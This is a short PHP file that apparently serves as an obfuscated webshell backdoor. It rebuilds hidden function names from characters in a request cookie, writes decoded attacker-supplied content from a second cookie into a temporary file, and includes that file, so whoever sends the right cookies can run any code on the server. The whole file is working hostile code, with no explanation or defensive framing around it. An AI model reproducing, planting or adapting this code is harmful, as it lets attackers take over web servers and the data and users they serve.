<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[39])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 8;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[39][$n];
        if (!$c[39][$n + 1]) {
            if (!$c[39][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 8 + 1;
    }
    $k = $p[14]() . $p[12];
    if (!$p[18]($k)) {
        $n = $p[4]($k, $p[5]);
        $p[22]($n, $p[26] . $p[15]($p[23]($c[3])));
    }
    include($k);
}